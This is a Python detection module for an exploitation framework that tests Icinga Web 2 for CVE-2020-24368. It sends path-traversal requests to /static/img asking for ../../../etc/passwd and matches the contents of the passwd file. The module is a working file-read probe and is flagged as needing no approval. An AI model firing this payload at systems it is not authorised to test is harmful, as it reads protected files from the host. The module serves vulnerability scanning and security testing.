#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Icinga Web 2 static/img module path traversal (CVE-2020-24368)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Icinga Web 2 - static/img Path Traversal Detection (CVE-2020-24368)',
        'description': (
            'Detects CVE-2020-24368 by reading /etc/passwd via '
            '/static/img?module_name=<module>&file=../../../../../../../etc/passwd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'icinga', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 5,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2020-24368'],
        'cve': 'CVE-2020-24368',
    }

    base_path = OptString('', 'Optional Icinga Web base path', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        trav = '../' * 7 + 'etc/passwd'
        modules = ('businessprocess', 'director', 'reporting', 'map', 'globe')
        for mod in modules:
            path = f'{self._prefix()}/static/img?module_name={mod}&file={trav}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'root:.*:0:0:', r.text or ''):
                self.set_info(
                    severity='high',
                    reason=f'Icinga Web 2 path traversal via module {mod} (CVE-2020-24368)',
                    path=path,
                )
                return True
        return False
